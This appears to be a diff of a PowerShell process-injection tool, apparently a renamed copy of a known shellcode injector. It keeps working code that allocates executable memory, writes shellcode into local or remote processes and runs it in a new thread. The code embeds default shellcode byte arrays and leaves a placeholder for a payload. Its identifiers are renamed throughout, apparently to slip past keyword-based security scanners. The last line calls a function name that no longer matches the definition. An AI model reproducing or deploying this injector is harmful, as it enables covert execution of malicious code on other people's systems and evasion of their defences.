@@ -1,4 +1,4 @@
-function Playnice-Coolness
+function Invoke-Niceness
 {
 
 
@@ -9,7 +9,7 @@ function Playnice-Coolness
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    $Coolness,
+    $Niceness,
     [Switch]
     $Force = $False
 )
@@ -37,7 +37,7 @@ function Playnice-Coolness
         $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
         $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-        $MethodBuilder = $TypeBuilder.DefineMethod('Playnice', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
 
     }
@@ -58,7 +58,7 @@ function Playnice-Coolness
         $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
         $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-        $Kern32Handle = $GetModuleHandle.Playnice($null, @($Module))
+        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
 
@@ -76,8 +76,8 @@ function Playnice-Coolness
         $CallStub = New-Object Byte[](0)
         if ($IntSizePtr -eq 8)
         {
-            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &Coolness
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Coolness
+            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &Niceness
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Niceness
             $CallStub += 0xFF,0xD0                              # CALL  RAX
             $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
             $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
@@ -86,8 +86,8 @@ function Playnice-Coolness
         }
         else
         {
-            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &Coolness
-            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Coolness
+            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &Niceness
+            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &Niceness
             $CallStub += 0xFF,0xD0                              # CALL  EAX
             $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
             $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
@@ -96,9 +96,9 @@ function Playnice-Coolness
         }
 
     }
-    function Local:Neat-RemoteCoolness ([Int] $ProcessID)
+    function Local:Play-RemoteNiceness ([Int] $ProcessID)
     {
-        $hProcess = $OpenProcess.Playnice(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
+        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
         if (!$hProcess)
         {
             Throw "Unable to open a process handle for PID: $ProcessID"
@@ -106,47 +106,47 @@ function Playnice-Coolness
         $IsWow64 = $false
         if ($64bitOS) # Only perform theses checks if CPU is 64-bit
         {
-            $IsWow64Process.Playnice($hProcess, [Ref] $IsWow64) | Out-Null
+            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
             if ((!$IsWow64) -and $PowerShell32bit)
             {
-                Throw 'Coolness Neation targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
+                Throw 'Niceness Playion targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
             }
             elseif ($IsWow64) # 32-bit Wow64 process
             {
-                if ($Coolness32.Length -eq 0)
+                if ($Niceness32.Length -eq 0)
                 {
-                    Throw 'No Coolness was placed in the $Coolness32 variable!'
+                    Throw 'No Niceness was placed in the $Niceness32 variable!'
                 }
-                $Coolness = $Coolness32
+                $Niceness = $Niceness32
 
 
             }
             else # 64-bit process
             {
-                if ($Coolness64.Length -eq 0)
+                if ($Niceness64.Length -eq 0)
                 {
-                    Throw 'No Coolness was placed in the $Coolness64 variable!'
+                    Throw 'No Niceness was placed in the $Niceness64 variable!'
                 }
-                $Coolness = $Coolness64
+                $Niceness = $Niceness64
 
             }
         }
         else # 32-bit CPU
         {
-            if ($Coolness32.Length -eq 0)
+            if ($Niceness32.Length -eq 0)
             {
-                Throw 'No Coolness was placed in the $Coolness32 variable!'
+                Throw 'No Niceness was placed in the $Niceness32 variable!'
             }
-            $Coolness = $Coolness32
+            $Niceness = $Niceness32
 
         }
-        $RemoteMemAddr = $VirtualAllocEx.Playnice($hProcess, [IntPtr]::Zero, $Coolness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Niceness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$RemoteMemAddr)
         {
-            Throw "Unable to allocate Coolness memory in PID: $ProcessID"
+            Throw "Unable to allocate Niceness memory in PID: $ProcessID"
         }
 
-        $WriteProcessMemory.Playnice($hProcess, $RemoteMemAddr, $Coolness, $Coolness.Length, [Ref] 0) | Out-Null
+        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Niceness, $Niceness.Length, [Ref] 0) | Out-Null
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
         if ($IsWow64)
         {
@@ -158,49 +158,49 @@ function Playnice-Coolness
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
 
         }
-        $RemoteStubAddr = $VirtualAllocEx.Playnice($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$RemoteStubAddr)
         {
             Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
         }
 
-        $WriteProcessMemory.Playnice($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
-        $ThreadHandle = $CreateRemoteThread.Playnice($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
+        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null
+        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
         {
             Throw "Unable to launch remote thread in PID: $ProcessID"
         }
-        $CloseHandle.Playnice($hProcess) | Out-Null
+        $CloseHandle.Invoke($hProcess) | Out-Null
 
     }
-    function Local:Neat-LocalCoolness
+    function Local:Play-LocalNiceness
     {
         if ($PowerShell32bit) {
-            if ($Coolness32.Length -eq 0)
+            if ($Niceness32.Length -eq 0)
             {
-                Throw 'No Coolness was placed in the $Coolness32 variable!'
+                Throw 'No Niceness was placed in the $Niceness32 variable!'
                 return
             }
-            $Coolness = $Coolness32
+            $Niceness = $Niceness32
 
         }
         else
         {
-            if ($Coolness64.Length -eq 0)
+            if ($Niceness64.Length -eq 0)
             {
-                Throw 'No Coolness was placed in the $Coolness64 variable!'
+                Throw 'No Niceness was placed in the $Niceness64 variable!'
                 return
             }
-            $Coolness = $Coolness64
+            $Niceness = $Niceness64
 
         }
-        $BaseAddress = $VirtualAlloc.Playnice([IntPtr]::Zero, $Coolness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Niceness.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$BaseAddress)
         {
-            Throw "Unable to allocate Coolness memory in PID: $ProcessID"
+            Throw "Unable to allocate Niceness memory in PID: $ProcessID"
         }
 
-        [System.Runtime.InteropServices.Marshal]::Copy($Coolness, 0, $BaseAddress, $Coolness.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($Niceness, 0, $BaseAddress, $Niceness.Length)
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
         if ($PowerShell32bit)
         {
@@ -212,21 +212,21 @@ function Playnice-Coolness
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
 
         }
-        $CallStubAddress = $VirtualAlloc.Playnice([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$CallStubAddress)
         {
             Throw "Unable to allocate thread call stub."
         }
 
         [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)
-        $ThreadHandle = $CreateThread.Playnice([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
+        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
         if (!$ThreadHandle)
         {
             Throw "Unable to launch thread."
         }
-        $WaitForSingleObject.Playnice($ThreadHandle, 0xFFFFFFFF) | Out-Null
-        $VirtualFree.Playnice($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-        $VirtualFree.Playnice($BaseAddress, $Coolness.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
+        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
+        $VirtualFree.Invoke($BaseAddress, $Niceness.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
 
     }
     $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
@@ -257,14 +257,14 @@ function Playnice-Coolness
     {
         $PowerShell32bit = $false
     }
-    if ($PSBoundParameters['Coolness'])
+    if ($PSBoundParameters['Niceness'])
     {
-        [Byte[]] $Coolness32 = $Coolness
-        [Byte[]] $Coolness64 = $Coolness32
+        [Byte[]] $Niceness32 = $Niceness
+        [Byte[]] $Niceness64 = $Niceness32
     }
     else
     {
-        [Byte[]] $Coolness32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
+        [Byte[]] $Niceness32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                   0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
@@ -277,7 +277,7 @@ function Playnice-Coolness
                                   0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
-        [Byte[]] $Coolness64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+        [Byte[]] $Niceness64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
@@ -314,9 +314,9 @@ function Playnice-Coolness
         $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
 
         if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
-                 "Neating Coolness Neating into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
+                 "Playing Niceness Playing into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
         {
-            Neat-RemoteCoolness $ProcessId
+            Play-RemoteNiceness $ProcessId
         }
     }
     else
@@ -334,14 +334,11 @@ function Playnice-Coolness
         $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
 
-        Neat-LocalCoolness
+            Play-LocalNiceness
         
     }   
 }
 
-
-#Paste code below this line
 #$$$SCODE$$$
-#Don't modify below this line
 
-Playnice-Coolness -Coolness $buf -Force
+Play-Niceness -Niceness $buf -Force
